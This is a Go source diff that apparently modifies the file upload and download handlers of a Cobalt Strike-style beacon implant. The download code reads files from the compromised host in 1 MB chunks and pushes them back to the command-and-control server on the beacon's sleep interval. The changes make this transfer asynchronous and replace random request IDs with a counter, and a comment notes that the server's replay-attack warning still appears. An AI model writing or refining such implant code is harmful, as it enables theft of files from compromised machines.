@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"io"
 	"io/ioutil"
+	"main/config"
 	"main/packet"
 	"main/util"
 	"os"
@@ -12,7 +13,9 @@ import (
 	"time"
 )
 
-func Upload(b []byte) error {
+var fileCounter = 0
+
+func Upload(b []byte, start bool) error {
 	filePathByte, fileContent, err := parseCommandUpload(b)
 	if err != nil {
 		return err
@@ -21,16 +24,16 @@ func Upload(b []byte) error {
 	//filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
 	// normalize path
 	filePath = strings.ReplaceAll(filePath, "\\", "/")
-	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
+	var fp *os.File
+	if start {
+		fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
+	} else {
+		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
+	}
 	if err != nil {
 		return err
 	}
-	defer func(fp *os.File) {
-		err := fp.Close()
-		if err != nil {
-			return
-		}
-	}(fp)
+	defer fp.Close()
 	_, err = fp.Write(fileContent)
 	if err != nil {
 		return err
@@ -149,7 +152,8 @@ func Download(b []byte) error {
 	fileLen := fileInfo.Size()
 	fileLenInt := int(fileLen)
 	fileLenBytes := packet.WriteInt(fileLenInt)
-	requestID := util.RandomInt(10000, 99999)
+	requestID := fileCounter
+	fileCounter++
 	requestIDBytes := packet.WriteInt(requestID)
 	result := util.BytesCombine(requestIDBytes, fileLenBytes, []byte(filePath))
 	packet.PushResult(packet.CALLBACK_FILE, result)
@@ -158,29 +162,30 @@ func Download(b []byte) error {
 	if err != nil {
 		return err
 	}
-	// revert to sync
-	// it seems download need continuous counter, so if I use go func to send result back,
-	// and if there is other cmd send their result, download would fail, and server will output counter error
-	//go func() {
-	var fileContent []byte
-	// 1M
-	fileBuf := make([]byte, 1024*1024)
-	for {
-		n, err := fileHandle.Read(fileBuf)
-		if err != nil && err != io.EOF {
-			break
+	// revert to async
+	// I just changed the requestID from randInt to incrementing from zero, then it works....
+	// even though sometimes the warning of replay attack warning still occur, download can be completed successfully
+	go func() {
+		var fileContent []byte
+		// 1M
+		fileBuf := make([]byte, 1024*1024)
+		for {
+			n, err := fileHandle.Read(fileBuf)
+			if err != nil && err != io.EOF {
+				break
+			}
+			if n == 0 {
+				break
+			}
+			fileContent = fileBuf[:n]
+			result = util.BytesCombine(requestIDBytes, fileContent)
+			packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
+			// sleep the same time as beacon
+			time.Sleep(time.Millisecond * time.Duration(config.WaitTime))
 		}
-		if n == 0 {
-			break
-		}
-		fileContent = fileBuf[:n]
-		result = util.BytesCombine(requestIDBytes, fileContent)
-		packet.PushResult(packet.CALLBACK_FILE_WRITE, result)
-		time.Sleep(time.Millisecond * 50)
-	}
 
-	packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
-	//}()
+		packet.PushResult(packet.CALLBACK_FILE_CLOSE, requestIDBytes)
+	}()
 	return nil
 }
 
